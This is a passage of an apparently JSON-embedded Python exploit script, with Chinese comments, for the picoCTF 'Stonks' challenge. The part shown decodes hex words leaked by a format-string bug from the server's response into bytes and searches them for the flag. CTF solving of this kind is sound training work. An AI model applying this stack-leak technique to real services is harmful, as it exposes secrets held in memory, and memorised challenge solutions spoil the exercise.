se:\\n{response_str}\")\n        \n        # 提取十六进制数据\n        # 寻找 \"Buying stonks with token:\" 后面的内容\n        if \"Buying stonks with token:\" in response_str:\n            parts = response_str.split(\"Buying stonks with token:\")\n            if len(parts) > 1:\n                leaked_part = parts[1].split(\"\\n\")[0].strip()\n                print(f\"Leaked hex values: {leaked_part}\")\n                \n                # 将十六进制值转换为字节流\n                hex_values = leaked_part.split('.')\n                raw_bytes = b''\n                for val in hex_values:\n                    if val:\n                        try:\n                            # 转换为整数，小端序转字节\n                            num = int(val, 16)\n                            raw_bytes += num.to_bytes(4, 'little')\n                        except ValueError:\n                            pass\n                \n                print(f\"Decoded bytes (first 200): {raw_bytes[:200]}\")\n                \n                # 搜索 flag\n                if b'picoCTF' in raw_bytes:\n                    match = re.search(rb'picoCTF\\{.*?\\}', raw_bytes)\n                    if match:\n                        print(f\"\\nFLAG FOUND: {match.group().decode()}\")\n                        return\n        \n        # 如果没找到，可能偏移不对，尝试更宽的范围或手动分析\n        print(\"Flag not found with current offset range. Try increasing range or checking output manually.\")\n        \n    except Exception as e:\n        print(f\"Error: {e}\")\n\nif __name__ == '__main__':\n    exploit()\n"}}
